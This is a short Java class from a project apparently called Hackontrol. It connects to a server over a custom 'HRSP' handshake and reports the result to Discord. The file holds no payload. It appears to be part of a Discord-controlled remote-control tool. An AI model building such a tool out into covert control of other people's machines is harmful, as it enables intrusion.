package com.khopan.hackontrol.hrsp;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.function.Consumer;

import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.interaction.HackontrolButton;
import com.khopan.hackontrol.utils.sendable.sender.ConsumerMessageCreateDataSendable;

import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;
import net.dv8tion.jda.api.utils.messages.MessageCreateData;

public class HRSPClient {
	public HRSPClient(String domainName, int port, Consumer<MessageCreateData> consumer) throws Throwable {
		Socket socket = new Socket(domainName, port);
		OutputStream outputStream = socket.getOutputStream();
		outputStream.write("HRSP 1.0 CONNECT".getBytes(StandardCharsets.UTF_8));
		InputStream inputStream = socket.getInputStream();
		String response = new String(inputStream.readNBytes(11), StandardCharsets.UTF_8);

		if(!"HRSP 1.0 OK".equals(response)) {
			HackontrolError.message(ConsumerMessageCreateDataSendable.of(consumer), "Invalid response: " + response);
			socket.close();
			return;
		}

		consumer.accept(new MessageCreateBuilder().setContent("**Connected**").addActionRow(HackontrolButton.delete()).build());
		socket.close();
	}
}
